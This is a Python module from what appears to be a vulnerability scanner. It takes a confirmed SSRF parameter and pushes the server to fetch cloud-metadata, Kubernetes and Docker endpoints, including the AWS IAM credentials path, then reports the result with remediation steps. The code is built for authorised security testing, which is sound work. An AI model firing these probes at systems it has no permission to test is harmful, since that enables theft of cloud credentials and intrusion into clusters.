"""H1 Cloud-metadata SSRF chain.

If a previous SSRF check confirmed the target fetches attacker-controlled URLs,
this check escalates by asking the server to fetch cloud-metadata endpoints for
AWS / GCP / Azure / DigitalOcean / Hetzner / Oracle / Alibaba. A reply that
mirrors the metadata format is proof the server can be used as a confused
deputy to exfiltrate IAM tokens.

Aggressive only — runs ONLY when the ssrf check has already flagged a confirmed
or suspected SSRF parameter (avoids blind probing of every URL parameter).
"""
from __future__ import annotations

from urllib.parse import urlparse

from ..http import Client
from ..models import Finding

# (provider, url, expected-substring-in-response)
METADATA_TARGETS = (
    ("AWS IMDSv1",         "http://169.254.169.254/latest/meta-data/",                            "ami-id"),
    ("AWS IMDSv2-no-token","http://169.254.169.254/latest/meta-data/iam/security-credentials/",   "AccessKeyId"),
    ("GCP",                "http://metadata.google.internal/computeMetadata/v1/instance/",        "service-accounts"),
    ("Azure IMDS",         "http://169.254.169.254/metadata/instance?api-version=2021-02-01",     "compute"),
    ("DigitalOcean",       "http://169.254.169.254/metadata/v1/",                                 "droplet"),
    ("Oracle Cloud",       "http://169.254.169.254/opc/v1/instance/",                             "displayName"),
    ("Alibaba Cloud",      "http://100.100.100.200/latest/meta-data/",                            "instance-id"),
    ("Hetzner",            "http://169.254.169.254/hetzner/v1/metadata/",                         "hostname"),
    # Kubernetes downward API often available from within compromised pods
    ("Kubernetes service", "http://kubernetes.default.svc.cluster.local/api/v1/",                 "apiVersion"),
    # Docker socket via TCP — extremely high impact if exposed
    ("Docker daemon",      "http://127.0.0.1:2375/version",                                       "ApiVersion"),
)


async def check(client: Client, ctx: dict) -> list[Finding]:
    findings: list[Finding] = []
    step = ctx.get("step") or (lambda _s: None)

    if not ctx.get("aggressive"):
        findings.append(Finding(
            severity="info",
            title="Cloud-metadata SSRF chain skipped (passive mode)",
            evidence="Pass --aggressive AND have a confirmed SSRF candidate.",
            remediation="No action.",
            url=ctx["target"],
        ))
        return findings

    # Read SSRF check's findings from the shared bus. If no candidate, skip.
    shared = ctx.get("shared") or {}
    ssrf_candidate = shared.get("ssrf_candidate")  # populated by ssrf.py when it finds one
    if not ssrf_candidate:
        findings.append(Finding(
            severity="info",
            title="Cloud-metadata SSRF chain skipped (no confirmed SSRF candidate)",
            evidence="The ssrf check must confirm a parameter that fetches attacker URLs before this chain runs.",
            remediation="No action.",
            url=ctx["target"],
        ))
        return findings

    # ssrf_candidate is {"url": <prepared URL>, "param": <name>}
    base_url = ssrf_candidate.get("url", "")
    param = ssrf_candidate.get("param", "?")
    if not base_url:
        return findings

    confirmed: list[tuple[str, str, str]] = []  # (provider, url, marker)
    for provider, meta_url, marker in METADATA_TARGETS:
        step(f"SSRF -> {provider}...")
        # Build the probe URL by replacing the SSRF-vulnerable parameter's value with meta_url
        from urllib.parse import urlparse as _u, parse_qsl, urlencode, urlunparse
        u = _u(base_url)
        qs = dict(parse_qsl(u.query))
        qs[param] = meta_url
        probe_url = urlunparse(u._replace(query=urlencode(qs)))
        try:
            r = await client.get(probe_url, headers={"Metadata-Flavor": "Google",  # GCP requires
                                                      "Metadata": "true"})           # Azure requires
        except Exception:  # noqa: BLE001
            continue
        if r is None:
            continue
        body = (r.text or "")[:4000]
        if marker.lower() in body.lower():
            confirmed.append((provider, meta_url, marker))

    if confirmed:
        findings.append(Finding(
            severity="critical",
            title=f"CONFIRMED cloud-metadata SSRF — {len(confirmed)} provider(s) reachable",
            evidence=(
                "Via the SSRF-vulnerable parameter, the server fetched and returned cloud-metadata:\n"
                + "\n".join(f"  - {p}: {u} (marker '{m}')" for p, u, m in confirmed)
                + "\n\nAn attacker can use this to steal IAM tokens, dump instance configuration, "
                "or — if Docker/Kubernetes is reachable — escape into the cluster."
            ),
            remediation=(
                "1. Fix the underlying SSRF (allow-list outbound URLs to a fixed set of trusted domains).\n"
                "2. Force IMDSv2 on AWS (`HttpTokens=required`) — IMDSv1 has no auth.\n"
                "3. Block egress to 169.254.169.254 / 100.100.100.200 from the application's network namespace.\n"
                "4. For Kubernetes/Docker: NetworkPolicy denying egress to the metadata + control-plane CIDRs."
            ),
            url=ctx["target"],
            extra={"providers_reached": [p for p, _u, _m in confirmed]},
        ))
    else:
        findings.append(Finding(
            severity="info",
            title="Cloud-metadata SSRF chain — no providers reachable",
            evidence=f"Tried {len(METADATA_TARGETS)} cloud-metadata endpoints via the confirmed SSRF parameter; none returned recognisable metadata.",
            remediation="Still fix the SSRF — it can target internal services beyond just metadata.",
            url=ctx["target"],
        ))
    return findings
